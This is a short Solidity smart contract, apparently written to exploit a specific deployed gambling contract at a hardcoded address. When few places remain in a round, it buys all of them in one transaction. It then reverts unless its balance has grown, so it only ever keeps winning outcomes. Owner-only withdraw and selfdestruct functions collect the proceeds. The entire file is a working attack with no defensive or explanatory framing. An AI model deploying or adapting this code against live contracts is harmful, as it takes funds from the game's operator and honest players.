1 pragma solidity ^0.5.0;
2 
3 interface TargetInterface {
4     function placesLeft() external view returns (uint256);
5 }
6 
7 contract AntiCryptoman {
8     
9     address payable targetAddress = 0x1Ef48854c57126085c2C9615329ED71fe159E390;
10     address payable private owner;
11     
12     modifier onlyOwner {
13         require(msg.sender == owner);
14         _;
15     }
16     
17     constructor() public payable {
18         owner = msg.sender;
19     }
20     
21     function ping(bool _toOwner) public payable onlyOwner {
22         TargetInterface target = TargetInterface(targetAddress);
23         uint256 placesLeft = target.placesLeft();
24         
25         require(placesLeft <= 7);
26         
27         uint256 betSize = 0.05 ether;
28         uint256 ourBalanceInitial = address(this).balance;
29         
30         for (uint256 ourBetIndex = 0; ourBetIndex < placesLeft; ourBetIndex++) {
31             (bool success, bytes memory data) = targetAddress.call.value(betSize)("");
32             require(success);
33             data;
34         }
35         
36         require(address(this).balance > ourBalanceInitial);
37         
38         if (_toOwner) {
39             owner.transfer(address(this).balance);
40         }
41     }
42     
43     function withdraw() public onlyOwner {
44         owner.transfer(address(this).balance);
45     }    
46     
47     function kill() public onlyOwner {
48         selfdestruct(owner);
49     }    
50     
51     function () external payable {
52     }
53     
54 }